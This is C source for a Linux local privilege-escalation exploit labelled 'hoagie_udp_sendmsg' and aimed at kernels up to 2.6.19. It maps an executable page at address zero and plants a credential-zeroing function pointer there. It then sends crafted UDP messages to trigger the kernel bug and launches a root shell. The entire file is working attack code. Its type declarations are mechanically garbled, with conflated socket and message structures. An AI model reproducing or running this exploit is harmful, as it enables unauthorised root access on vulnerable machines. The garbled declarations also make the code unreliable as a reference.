
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int msg_namelen; struct sockaddr_in* msg_name; int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct msghdr {int msg_namelen; struct msghdr* msg_name; int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
typedef int sin ;


 int AF_INET ;
 int MAP_ANONYMOUS ;
 char* MAP_FAILED ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 int MSG_MORE ;
 int MSG_PROXY ;
 int PF_INET ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SOCK_DGRAM ;
 int close (int) ;
 int exit (int) ;
 int fprintf (int ,char*) ;
 int htons (int) ;
 int inet_addr (char*) ;
 int memset (struct sockaddr_in*,int ,int) ;
 char* mmap (int ,int,int,int,int ,int ) ;
 int sendmsg (int,struct sockaddr_in*,int) ;
 scalar_t__ set_current_task_uids_gids_to_zero ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int system (char*) ;

int main(int argc, char **argv) {
   int s;
   struct msghdr header;
   struct sockaddr_in sin;
   char *rtable = ((void*)0);

   fprintf(stderr,
           "hoagie_udp_sendmsg.c - linux root <= 2.6.19 local\n"
               "-andi / void.at\n\n");

   s = socket(PF_INET, SOCK_DGRAM, 0);
   if (s == -1) {
      fprintf(stderr, "[*] can't create socket\n");
      exit(-1);
   }




   memset(&header, 0, sizeof(struct msghdr));
   memset(&sin, 0, sizeof(struct sockaddr_in));
   sin.sin_family = AF_INET;
   sin.sin_addr.s_addr = inet_addr("127.0.0.1");
   sin.sin_port = htons(22);
   header.msg_name = &sin;
   header.msg_namelen = sizeof(sin);
   rtable = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
   if (rtable == MAP_FAILED) {
      fprintf(stderr, "[*] mmap failed\n");
      exit(-1);
   }
   *(int *)(rtable + 0x74) = (int)set_current_task_uids_gids_to_zero;
   sendmsg(s, &header, MSG_MORE|MSG_PROXY);
   sendmsg(s, &header, 0);

   close(s);

   system("/bin/sh");

   return 0;
}
